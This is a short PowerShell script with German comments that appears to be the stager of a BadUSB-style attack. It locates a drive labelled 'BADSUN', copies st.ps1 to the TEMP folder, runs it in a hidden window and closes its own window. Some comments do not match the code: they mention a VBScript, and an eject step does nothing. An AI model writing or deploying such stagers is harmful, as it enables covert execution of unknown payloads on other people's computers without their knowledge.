function Get-USBDriveLetter {
    $usbDrive = Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE Label='BADSUN'" | Select-Object -First 1
    return $usbDrive.DriveLetter
}

# USB-Laufwerksbuchstaben ermitteln
$usbDriveLetter = Get-USBDriveLetter

if ($usbDriveLetter) {
    # Pfad zur VBScript-Datei auf dem USB-Laufwerk
    $usbScriptPath = Join-Path -Path $usbDriveLetter -ChildPath "st.ps1"
    
    # Pfad zum temporären Ordner
    $tempScriptPath = Join-Path -Path $env:TEMP -ChildPath "st.ps1"

    # Datei script.vbs in den temporären Ordner kopieren
    Copy-Item -Path $usbScriptPath -Destination $tempScriptPath -Force

    # VBScript im Hintergrund ausführen
    Start-Process -FilePath "powershell.exe" -ArgumentList "`"$tempScriptPath`"" -WindowStyle Hidden

    # Sound abspielen
    [System.Media.SystemSounds]::Beep.Play()

    # USB-Laufwerk sicher auswerfen
    $usbDriveLetter = $usbDriveLetter.TrimEnd(':')  # Entferne das ":" vom Laufwerksbuchstaben

    # Ursprüngliches PowerShell-Fenster schließen
    Stop-Process -Id $PID
} else {
    Write-Host "USB-Laufwerk mit dem Namen 'BADSUN' wurde nicht gefunden."
}
